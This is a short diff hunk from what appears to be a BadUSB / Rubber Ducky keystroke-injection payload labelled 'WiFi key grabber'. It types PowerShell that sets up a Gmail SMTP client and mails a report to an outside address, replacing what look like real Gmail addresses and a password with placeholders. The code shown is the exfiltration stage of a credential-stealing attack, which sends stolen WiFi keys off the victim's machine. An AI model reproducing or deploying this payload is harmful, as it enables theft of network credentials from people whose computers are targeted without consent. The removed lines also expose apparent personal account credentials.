@@ -28,13 +28,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('iwannafeelonelasttime@gmail.com', 'avijitisdumb')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Sender@gmail.com', 'Sender_Pass')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'iwannafeelonelasttime@gmail.com'
+STRING $ReportEmail.From = 'Sender@gmail.com'
 ENTER
-STRING $ReportEmail.To.Add('psinghania929@gmail.com')
+STRING $ReportEmail.To.Add('Reciever@gmail.com')
 ENTER
 STRING $ReportEmail.Subject = 'WiFi key grabber'
 ENTER
